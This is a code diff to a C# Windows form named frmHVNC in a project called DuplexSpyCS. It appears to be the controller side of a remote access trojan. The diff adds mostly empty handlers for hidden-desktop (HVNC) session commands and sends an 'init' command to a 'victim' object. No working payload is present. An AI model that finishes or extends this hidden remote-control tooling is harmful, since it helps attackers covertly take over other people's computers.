@@ -27,7 +27,6 @@ namespace DuplexSpyCS
             public string szDesktopName;
             public string szExeFilePath;
             public string szArguments;
-            public bool bMaximized;
             public TabPage page;
 
             public bool bIsNull { get { return string.IsNullOrEmpty(szDesktopName) || page == null; } }
@@ -53,9 +52,25 @@ namespace DuplexSpyCS
 
             if (lsMsg[0] == "hvnc")
             {
+                
                 if (lsMsg[1] == "window")
                 {
+                    if (lsMsg[2] == "init")
+                    {
 
+                    }
+                    else if (lsMsg[2] == "start")
+                    {
+
+                    }
+                    else if (lsMsg[2] == "stop")
+                    {
+
+                    }
+                    else if (lsMsg[2] == "close")
+                    {
+
+                    }
                 }
                 else if (lsMsg[1] == "mouse")
                 {
@@ -147,11 +162,20 @@ namespace DuplexSpyCS
 
         void fnSetup()
         {
+            toolStripStatusLabel1.Text = $"Initializing...";
+
             // Remove all tabpages
             foreach (TabPage page in tabControl1.TabPages)
                 tabControl1.TabPages.Remove(page);
 
             m_victim.m_listener.ReceivedDecoded += fnRecv;
+
+            m_victim.fnSendCommand(new string[]
+            {
+                "hvnc",
+                "window",
+                "init",
+            });
         }
 
         private void frmHVNC_Load(object sender, EventArgs e)
@@ -194,7 +218,6 @@ namespace DuplexSpyCS
                 ("Desktop", session.szDesktopName),
                 ("Executable", session.szExeFilePath),
                 ("Arguments", session.szArguments),
-                ("Maximized", session.bMaximized ? "True" : "False"),
             });
 
             foreach (var prop in ls)
@@ -206,7 +229,26 @@ namespace DuplexSpyCS
             }
         }
 
+        // Help
         private void toolStripButton1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        // Add
+        private void toolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        // Close
+        private void toolStripMenuItem2_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        // Close All
+        private void toolStripMenuItem3_Click(object sender, EventArgs e)
         {
 
         }
